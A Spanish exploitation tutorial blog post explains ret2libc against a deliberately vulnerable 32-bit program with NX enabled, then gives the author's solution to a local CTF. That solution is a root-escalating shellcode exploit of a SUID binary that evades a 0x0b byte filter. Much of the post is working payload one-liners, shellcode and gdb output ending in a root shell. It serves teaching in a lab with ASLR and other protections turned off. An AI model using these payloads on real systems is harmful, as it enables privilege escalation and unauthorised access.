---
layout: es/blog-detail
comments: true
title: "ret2libc: Disparando con su propia pistola"
date: 2018-07-05T14:33:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - 32 bit
    - ret2lib
    - ret2lib
    - stack
    - stack overflow
    - x86
    - x86
image_src: /assets/uploads/2018/07/puffinsecurity-ret2libc-Disparando-con-su-propia-pistola-e1563961311239.jpg
image_height: 467
image_width: 700
author: Yago Gutierrez
description: A partir del año 2000 los sistemas operativos comenzaron a soportar el bit NX y emuladores del mismo. Aparece el parche PaX para Linux (quien también incluye ASLR), ExecShield (RedHat), W^X (OpenBSD y macOS), y DEP (Windows a partir de WinXP SP2). Esta protección consiste...
publish_time: 2018-07-05T14:33:00+00:00
modified_time: 2019-02-19T14:36:39+00:00
comments_value: 0
disqus_identifier: 1737
---
A partir del año 2000 los sistemas operativos comenzaron a soportar el bit NX y emuladores del mismo. Aparece el parche PaX para Linux (quien también incluye ASLR), ExecShield (RedHat), W^X (OpenBSD y macOS), y DEP (Windows a partir de WinXP SP2).  
Esta protección consiste en diferenciar las páginas de memoria con permisos de ejecución. De esta forma aquellas páginas que cargan código tendrán permisos de ejecución pero no de escritura, en caso de intentar escribir en ellas el programa romperá, y por otro lado las páginas de datos (stack, heap, .data, .bss) poseerán permisos de escritura y no de ejecución, y por último ciertas zonas tendrán permisos solo de lectura (.rel.plt).

Antes de comenzar recordar que seguimos sin ASLR (`sudo sysctl -w kernel.randomize_va_space=0`).  
A la hora de compilar los programas a partir de ahora será sin el parámetro de gcc `-z execstack`. Veamos lo que ocurre cuando intentamos ejecutar un programa con NX de la forma que venimos haciendo.  
``$ gcc vuln.c -o vuln -fno-stack-protector -D_FORTIFY_SOURCE=0 -m32 -no-pie -fno-pie  
[...]  
$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 0x37654136  
[*] Exact match at offset 140  
[...]  
(gdb) display/i $pc  
[...]  
(gdb) run `perl -e 'print "A"x144'`  
Starting program: /home/arget/vuln `perl -e 'print "A"x144'` ``

Breakpoint 1, 0x080484dd in imprimir ()  
1: x/i $pc  
\=> 0x80484dd <imprimir+27>: add $0x10,%esp  
(gdb) x/5x $esp  
0xffffd210: 0xffffd220 0xffffd4f4 0xf7e5e549 0x000000c2  
0xffffd220: 0x41414141  
\[…\]  
(gdb) run «\`cat sc.o«perl -e ‘print «A»x(140-33) . «x20xd2xffxff»‘\`»  
Starting program: /home/arget/vuln «\`cat sc.o«perl -e ‘print «A»x(140-33) . «x20xd2xffxff»‘\`»  
\[…\]  
Breakpoint 2, 0x080484f4 in imprimir ()  
1: x/i $pc  
\=> 0x80484f4 <imprimir+50>: ret  
(gdb) nexti  
0xffffd220 in ?? ()  
1: x/i $pc  
\=> 0xffffd220: xor %eax,%eax  
(gdb) nexti

Program received signal SIGSEGV, Segmentation fault.  
0xffffd220 in ?? ()  
Puede verse cómo al intentar ejecutar el comienzo de nuestro shellcode en el stack (`xor eax, eax`) rompe, precisamente por no tener permisos. Podemos comparar el /proc/$pid/mem de un proceso con el stack ejecutable y otro con el stack protegido  

    Protegido:
    fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

No protegido:  
fffdd000-ffffe000 rwxp 00000000 00:00 0 \[stack\]

Esta medida de protección tiene una solución muy sencilla, se denomina ret2libc, consiste en saltar a una función de librería. Tengamos en cuenta cómo queda el stack cuando se efectúa una instrucción `call`.

+------------------+ <- EBP
|       ...        |
+------------------+
|       arg1       |
+------------------+
|       arg2       |
+------------------+
         .
         .
+------------------+
|       arg-n      |
+------------------+
|   EIP guardado   |
+------------------+ <- ESP

De forma que la función busca los argumentos que necesita por encima del EIP guardado (y del EBP que guarda durante su prólogo de función), recogiendo el EIP guardado al finalizar mediante `ret`. Una función que nos interesa especialmente de la librería es `system()`, en concreto como `system("/bin/sh")`. Veamos ahora el esquema del stack de nuestra función vulnerable tras la explotación (pero antes del epílogo) mediante ret2libc.

|buf       |EBP(s)|EIP(s)     | EIP(s) para system | arg de system()   |arg para XXX
+-----+-----  ---+------+-----------+--------------------+-------------------+-------------+-----+
| ... |   Relleno       | &system() |        XXX         |   &"/bin/sh #"    | "/bin/sh #" | ... |
+-----+-----  ---+------+-----------+--------------------+-------------------+-------------+-----+
└ESP             └EBP               └ system() recogerá  └---->-------->-----┘
                                      con su ret esto

\[Donde `EBP(s)` y `EIP(s)` se corresponden con el EBP guardado y el EIP guardado, respectivamente («s» de «saved»)\].  
Al no poder nosotros introducir un byte nulo que termine la cadena «/bin/sh», colocaremos un carácter punto y coma que termine el comando, si bien cuando salgamos, se intentará ejecutar como comando lo que sea que haya detrás de nuestro, esto se puede evitar introduciendo «/bin/sh #» \[o «/bin/sh;#»\].

Espero que quede claro que system() al salir saltará a la dirección que se encuentre donde pone `XXX`, esto se debe precisamente porque hemos colocado las cosas para que encajen según el primer gráfico, dejándolo del mismo modo que si hubiésemos entrado en system() mediante un `call`. En `XXX` podríamos situar entonces &exit(), que tomará como argumento los 4 bytes situados tras la dirección de «/bin/sh #», es decir, «/bin».

No estaría mal que, antes de continuar, el lector entendiese el funcionamiento de system() mediante el comando `man`.  
Podemos obtener las direcciones de system() y exit() mediante gdb, al mismo tiempo veremos en qué dirección queda nuestro «/bin/sh #».  
`$ gdb -q vuln  
Reading symbols from vuln...(no debugging symbols found)...done.  
(gdb) start  
Temporary breakpoint 1 at 0x8048503  
Starting program: /home/arget/vuln`

Temporary breakpoint 1, 0x08048503 in main ()  
(gdb) p system  
$1 = {<text variable, no debug info>} 0xf7e01f80 <system>  
(gdb) p exit  
$2 = {<text variable, no debug info>} 0xf7df4f10 <exit>  
Ya que tenemos las dirs de system() y exit() procedemos a buscar en qué dirección situar nuestra bonita cadena (recordar que como «/bin/sh #» tiene un espacio es necesario entrecomillar el argumento entero).  
`(gdb) unset environment LINES  
(gdb) unset environment COLUMNS  
(gdb) disas imprimir  
Dump of assembler code for function imprimir:`

    0x080484c2 <+0>:     push   %ebp
       0x080484c3 <+1>:     mov    %esp,%ebp
       0x080484c5 <+3>:     sub    $0x88,%esp
       0x080484cb <+9>:     sub    $0x8,%esp
       0x080484ce <+12>:    pushl  0x8(%ebp)
       0x080484d1 <+15>:    lea    -0x88(%ebp),%eax
       0x080484d7 <+21>:    push   %eax
       0x080484d8 <+22>:    call   0x8048370 <strcpy@plt>
       0x080484dd <+27>:    add    $0x10,%esp
       0x080484e0 <+30>:    sub    $0xc,%esp
       0x080484e3 <+33>:    lea    -0x88(%ebp),%eax
       0x080484e9 <+39>:    push   %eax
       0x080484ea <+40>:    call   0x8048380 <puts@plt>
       0x080484ef <+45>:    add    $0x10,%esp
       0x080484f2 <+48>:    nop
       0x080484f3 <+49>:    leave  
       0x080484f4 <+50>:    ret    

``End of assembler dump.  
(gdb) br *imprimir +50  
Note: breakpoint 1 also set at pc 0x80484f4.  
Breakpoint 1 at 0x80484f4  
(gdb) run "`perl -e 'print "A"x140 . "BBBB" . "CCCC" . "DDDD" . "/bin/sh #"'`"  
Starting program: /home/arget/vuln "`perl -e 'print "A"x140 . "BBBB" . "CCCC" . "DDDD" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD/bin/sh #``

Breakpoint 1, 0x080484f4 in imprimir ()  
(gdb) x/s $esp  
0xffffd29c: «BBBBCCCCDDDD/bin/sh #»  
(gdb)  
Ya tenemos el exploit casi terminado, solo necesitamos sustituir en el argumento que hemos pasado al programa los datos que acabamos de obtener en sus respectivos sitios: las B’s por &system, las C’s por &exit, y las D’s por la dirección de «/bin/sh #» (0xffffd2a8). exit() tomará como argumento «/bin» (0x6e69622f) \[de esos bytes solo devolverá 0x2f\], lo preferible sería colocar aquí un 0x00000000 y tras ello nuestro «/bin/sh #», pero no podemos olvidar que no tenemos la posibilidad de introducir ningún byte nulo.  
Veamos qué ocurre al explotarlo  
``(gdb) run "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8xd2xffxff" . "/bin/sh #"'`"  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /home/arget/vuln "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8xd2xffxff" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� �� O������/bin/sh #``

Breakpoint 1, 0x080484f4 in imprimir ()  
(gdb) c  
Continuing.  
sh-4.4$ exit  
\[Inferior 1 (process 9328) exited with code 057\]  
Pues síp, ha funcionado. Nótese que el valor de retorno del programa es 0x2f (que en octal es 057).  
Ahora vamos fuera de gdb  
``$ /home/arget/vuln "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8xd2xffxff" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� �� O������/bin/sh #``  
Por supuesto, no podía dejarme acabar el post tranquilito, claro que no.  
Tras recalcular la dirección de la cadenita (pista: ltrace te muestra la dirección de buf)  
``$ /home/arget/vuln "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "x98xd2xffxff" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� �� O������/bin/sh #  
sh-4.4$``  
Debido al funcionamiento interno de system() (es al final un execl() a «sh», por lo que se nos fastidia el SUID). La solución sería ejecutar primero un setuid(0)…

Por último quiero indicar que también se puede buscar en el binario o alguna librería la cadena «/bin/sh», o en exploits locales se puede emplear como método de introducción de la cadena una variable del entorno.

Nos vemos en la segunda parte de este post.

Explotar el programa vulnerable (con SUID activado) tratado en este post para conseguir root (ejem..setuid(0)) mediante ret2libc (pista, no siempre tienes por qué saltar al comienzo de una función).  
Con NX activado y sin ASLR (\*muy\* fácil).

En la [entrada anterior](/shellcodes-el-codigo-de-la-cascara/) comenzamos un pequeño ctf propio. Consistía en explotar mediante varios shellcodes distintos un programa (el código en el post anterior, al final). Yo traigo aquí mi solución.  
Nada más comenzar observamos que el programa nos filtra el byte 0x0b. Es perfectamente posible que el lector no se percate de inmediato del problema que es esto, y es que resulta que 0x0b es el valor que debemos situar en EAX para realizar la syscall execve(). Bueno, primero lo primero, estudiemos el programa desde el punto de vista de un exploiter, o sea, desde el nuestro  
`$ sudo sysctl -w kernel.randomize_va_space=0  
[sudo] password for arget:  
kernel.randomize_va_space = 0`

$ gcc a.c -o a -m32 -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z execstack -no-pie -fno-pie

$ sudo chown root:root a

$ sudo chmod u+s a

$ gdb -q a  
Reading symbols from a…(no debugging symbols found)…done.  
(gdb) run \`/opt/metasploit/tools/exploit/pattern\_create.rb -l 2000\`  
Starting program: /home/arget/a \`/opt/metasploit/tools/exploit/pattern\_create.rb -l 2000\`  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co

    Program received signal SIGSEGV, Segmentation fault.
    0x69423569 in ?? ()
    (gdb) 
    [1]+  Detenido                gdb -q a

$ /opt/metasploit/tools/exploit/pattern\_offset.rb -q 0x69423569  
\[\*\] Exact match at offset 1036

$ fg  
gdb -q a

(gdb) disas imprimir  
Dump of assembler code for function imprimir:  
0x08048542 <+0>: push %ebp  
0x08048543 <+1>: mov %esp,%ebp  
0x08048545 <+3>: sub $0x408,%esp  
0x0804854b <+9>: sub $0x8,%esp  
0x0804854e <+12>: push $0xb  
0x08048550 <+14>: pushl 0x8(%ebp)  
0x08048553 <+17>: call 0x80483e0 <strchr@plt>  
0x08048558 <+22>: add $0x10,%esp  
0x0804855b <+25>: test %eax,%eax  
0x0804855d <+27>: je 0x8048564 <imprimir+34>  
0x0804855f <+29>: call 0x8048522 <panic>  
0x08048564 <+34>: sub $0x8,%esp  
0x08048567 <+37>: pushl 0x8(%ebp)  
0x0804856a <+40>: lea -0x408(%ebp),%eax  
0x08048570 <+46>: push %eax  
0x08048571 <+47>: call 0x80483b0 <strcpy@plt>  
0x08048576 <+52>: add $0x10,%esp  
0x08048579 <+55>: sub $0xc,%esp  
0x0804857c <+58>: lea -0x408(%ebp),%eax  
0x08048582 <+64>: push %eax  
0x08048583 <+65>: call 0x80483c0 <puts@plt>  
0x08048588 <+70>: add $0x10,%esp  
0x0804858b <+73>: nop  
0x0804858c <+74>: leave  
0x0804858d <+75>: ret  
End of assembler dump.  
(gdb) br \*imprimir +52  
Breakpoint 1 at 0x8048576  
(gdb) unset environment LINES  
(gdb) unset environment COLUMNS  
(gdb) run \`perl -e ‘print «A»x1036’\`XXXX  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /home/arget/a \`perl -e ‘print «A»x1036’\`XXXX

Breakpoint 1, 0x08048576 in imprimir ()  
(gdb) x/5x $esp  
0xffffcb00: 0xffffcb10 0xffffd16b 0xf7ffcfbc 0xf7fd68a6  
0xffffcb10: 0x41414141  
(gdb)

Pues ya tenemos el control de EIP, fácil, ¿no? (Pues hace unos días no te lo parecía eh).  
Además ya tenemos la dirección de buf.  
Observemos qué ocurre cuando lo intentamos explotar mediante nuestro shellcode  

    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ebx, esp  
push eax  
push ebx  
mov ecx, esp  
mov al, 0xb ; execve  
xor edx, edx  
int 0x80

$ xxd sc.o  
00000000: 31c0 b0d5 31c9 cd80 31c0 5068 2f2f 7368 1…1…1.Ph//sh  
00000010: 682f 6269 6e89 e350 5389 e1b0 0bcd 80 h/bin..PS……

$ /home/arget/a «\`cat sc.o«perl -e ‘print «A»x(1036-31) . «x10xcbxffxff»‘\`»  
Intento de hacking detectado

La solución más obvia es hacer un shellcode que ejecute un `mov al, 0xc ; sub al, 0x1`, es decir, colocar en eax un 0xc y restarle 1 para obtener así 0xb.  

    # Sol 1
    $ cat sc.asm
    BITS 32
    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80
    xor    eax, eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    push   eax
    push   ebx
    mov    ecx, esp
    mov    al, 0xc   ; !!
    sub    al, 0x1   ; !!
    xor    edx, edx
    int    0x80

`  
$ nasm sc.asm -o sc.o`

$ lol sc.o  
\-rw-r–r– 1 arget arget 35 jul 5 11:02 sc.o

$ /home/arget/a \`cat sc.o«perl -e ‘print «A»x(1036-35) . «x10xcbxffxff»‘\`  
1���1�̀1�Ph//shh/bin��PS���  
, 1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
sh-4.4# whoami  
root  
sh-4.4#

Lo siguiente que se me ocurrió fue buscar otra llamada al sistema de la familia exec\*()  
`$ cat /usr/include/asm/unistd_32.h | grep exec  
#define __NR_execve 11  
#define __NR_kexec_load 283  
#define __NR_execveat 358`  
Vemos nuestro execve() de siempre y dos entradas más. Como kexec\_load() sirve para cargar un nuevo kernel (cosa que no nos interesa), nos queda execveat(). En su página de `man` vemos muchas cosas interesantes. Básicamente con un código como el que sigue podemos abrir «/bin/sh»

    #include <unistd.h>

int main()  
{  
char \*arg\[2\] = {«/bin/sh», NULL};  
// int execveat(int dirfd, const char \*pathname, char \*const argv\[\], char \*const envp\[\], int flags);  
execveat(0x12345678, arg\[0\], arg, NULL);  
}

El primer argumento de execveat() es tan aleatorio simplemente para demostrar lo que dice el manual

> If pathname is absolute, then dirfd is ignored.

Por otra parte, el apartado de flags nos indica que mejor dejarlo como NULL.  
Posiblemente ese programa en C no compile, pues esa función no se encuentra en la librería de C  
`$ man 3 execveat  
Ningún registro del manual para execveat en sección 3`  
Ignoro si algún estándar como POSIX u otro la incluye. Pero a nosotros nos da iguáh, (en este caso) solo jugamos con syscalls, no con la librería (los libros déjamelos tranquilitos).

EAX -> 358                 ; \_\_NR\_execveat
EBX -> xxx                 ; da igual qué contiene, no es nada porno
ECX -> &"/bin/sh"          ; pathname (que es por cierto una ruta absoluta)
EDX -> &\["/bin/sh", NULL\]  ; argv
ESI -> NULL                ; envp
EDI -> NULL                ; flags

A ver el shellcode

    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ecx, esp ; ecx = pathname = &»/bin/sh»  
push eax  
push ecx  
mov edx, esp ; edx = argv = &\[«/bin/sh», NULL\]  
mov ax, 0x166 ; eax = \_\_NR\_execveat  
xor esi, esi ; esi = envp = null  
xor edi, edi ; edi = flags = null  
int 0x80

Y la explotación  

    # Sol 2
    $ cat sc.asm
    BITS 32
    global _start
    _start:
    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ecx, esp  
push eax  
push ecx  
mov edx, esp  
mov ax, 0x166  
xor esi, esi  
xor edi, edi  
int 0x80

$ ndisasm -b32 sc.o  
00000000 31C0 xor eax,eax  
00000002 B0D5 mov al,0xd5  
00000004 31DB xor ebx,ebx  
00000006 CD80 int 0x80  
00000008 31C0 xor eax,eax  
0000000A 50 push eax  
0000000B 682F2F7368 push dword 0x68732f2f  
00000010 682F62696E push dword 0x6e69622f  
00000015 89E1 mov ecx,esp  
00000017 50 push eax  
00000018 51 push ecx  
00000019 89E2 mov edx,esp  
0000001B 66B86601 mov ax,0x166  
0000001F 31F6 xor esi,esi  
00000021 31FF xor edi,edi  
00000023 CD80 int 0x80

`  
$ lol sc.o  
-rw-r--r-- 1 arget arget 37 jul 5 01:25 sc.o`

$ /home/arget/a \`cat prueba/sc.o«perl -e ‘print «A»x(1036-37) . «x10xcbxffxff»‘\`  
1���1�̀1�Ph//shh/bin��PQ��f�f 1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
sh-4.4# whoami  
root  
sh-4.4# exit

Mediante strace podemos ver nuestra ejecución:  
```$ strace /home/arget/a `cat prueba/sc.o``perl -e 'print "A"x(1036-37) . "x10xcbxffxff"'`  
execve("/home/arget/a", ["/home/arget/a", "130026032513333152001300Ph//shh/bin211341PQ211342f270f011"...], 0x7fffffffdeb8 /* 38 vars */) = 0  
strace: [ Process PID=3496 runs in 32 bit mode. ]  
access("/etc/suid-debug", F_OK) = -1 ENOENT (No existe el fichero o el directorio)  
[...]  
write(1, "130026032513333152001300Ph//shh/bin211341PQ211342f270f011"..., 10241���1�̀1�Ph//shh/bin��PQ��f�f 1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA